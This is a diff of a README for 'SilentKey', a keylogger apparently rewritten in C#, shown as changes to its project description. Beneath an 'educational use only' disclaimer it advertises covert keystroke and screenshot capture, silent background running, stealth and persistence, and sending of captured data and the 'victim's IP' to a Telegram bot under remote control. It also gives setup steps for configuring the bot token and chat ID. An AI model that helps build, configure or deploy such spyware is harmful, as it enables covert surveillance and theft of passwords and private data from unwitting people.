@@ -1,4 +1,4 @@
-# SilentKey - Educational Keylogger for Cybersecurity Learning
+# SilentKey v2.0 — Educational Keylogger (C# Rewrite)
 
 ![Warning](https://img.shields.io/badge/Warning-Educational%20Use%20Only-red)
 
@@ -6,32 +6,43 @@
 
 ## ⚠️ Disclaimer
 
-**SilentKey** is a simple keylogger created solely for educational and research purposes in cybersecurity. It captures keystrokes and periodic screenshots, sending them securely to a Telegram bot.
+**SilentKey** is an **educational keylogger** rewritten in C# for native Windows execution.  
+It is created **only for learning and research purposes** in cybersecurity.  
+It captures keystrokes and periodic screenshots, sending them securely to a Telegram bot.
 
 **Important:**
-
 - Use this tool **only** on machines you own or have explicit permission to test.
 - Unauthorized use is illegal and unethical.
-- This project is designed to help you learn about keylogging techniques, encryption, and secure data transmission.
+- This project is designed to help you learn about:
+  - Keylogging techniques.
+  - Encrypted & secure data transmission.
+  - Stealth and persistence.
 
 ---
 
-## Features
+## ✨ Features
 
-- Records keystrokes in a readable format.
-- Takes screenshots every 30 seconds.
-- Sends data to a Telegram bot via encrypted messages.
-- Runs silently in the background.
-- Sends an initial status message with the victim’s IP when started.
-- Simple base64 encoding for easy readability (you must decode the keylogs)
-
----
-
-## Setup & Usage
-
-1. Create a Telegram bot and get the Bot Token.
-2. Find your Telegram chat ID (where you want to receive logs).
-3. Configure the `token`, `chat_id`, and `encryption_key` variables in the script.
-4. Run the script on the target machine **with permission**.
+✅ Native C# implementation — no Python required.  
+✅ Records keystrokes in a clean, readable format.  
+✅ Takes periodic screenshots (interval adjustable remotely).  
+✅ Sends data securely to a Telegram bot (encrypted).  
+✅ Fully silent — no visible console or window.  
+✅ Sends initial status message with external IP.  
+✅ Remote control: adjust screenshot interval at runtime via bot commands.
 
 ---
+
+## 🛠️ Setup & Usage
+
+### 1️⃣ Create your Telegram Bot
+- Talk to [@BotFather](https://t.me/BotFather) and create a new bot.
+- Save the Bot Token.
+
+### 2️⃣ Get your Telegram Chat ID
+- Use @userinfobot or other methods to find your chat ID.
+
+### 3️⃣ Configure the Code
+- Open `Program.cs` and fill in:
+  ```csharp
+  private static string telegramToken = "YOUR_TELEGRAM_BOT_TOKEN";
+  private static string chatId = "YOUR_CHAT_ID";
